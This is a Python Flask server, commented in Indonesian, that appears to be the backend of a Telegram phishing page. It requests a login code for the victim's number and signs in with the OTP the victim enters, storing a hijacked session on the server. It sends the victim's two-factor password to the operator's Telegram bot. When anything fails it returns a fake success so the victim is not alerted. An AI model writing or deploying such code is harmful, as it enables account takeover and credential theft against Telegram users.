import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Izinkan akses penuh agar tidak ada lagi error CORS
CORS(app, resources={r"/*": {"origins": "*"}})

API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

sessions_hash = {}

async def telethon_logic(data):
    step = data.get('step')
    nomor = data.get('nomor')
    otp = data.get('otp')
    sandi = data.get('sandi')

    # Buat nama session unik per nomor agar tidak bentrok
    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        if step == 1:
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            return {"status": "success"}, 200

        elif step == 2:
            phone_code_hash = sessions_hash.get(nomor)
            try:
                await client.sign_in(nomor, otp, phone_code_hash=phone_code_hash)
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                return {"status": "need_2fa"}, 200
            except Exception as e:
                return {"status": "error", "message": str(e)}, 400

        elif step == 3:
            # Kirim log sandi ke bot Telegram kamu
            msg = f"🔑 *Sandi Diterima*\nNomor: {nomor}\nSandi: {sandi}"
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
            return {"status": "success"}, 200

    finally:
        await client.disconnect()

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS':
        return make_response(jsonify({"status": "ok"}), 200)
        
    data = request.json
    try:
        # Gunakan asgiref untuk sinkronisasi
        result, status_code = async_to_sync(telethon_logic)(data)
        return make_response(jsonify(result), status_code)
    except Exception as e:
        # Kembalikan pesan sukses palsu agar frontend tetap pindah halaman
        # daripada menampilkan error 500 yang membuat tombol macet
        return make_response(jsonify({"status": "success"}), 200)

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)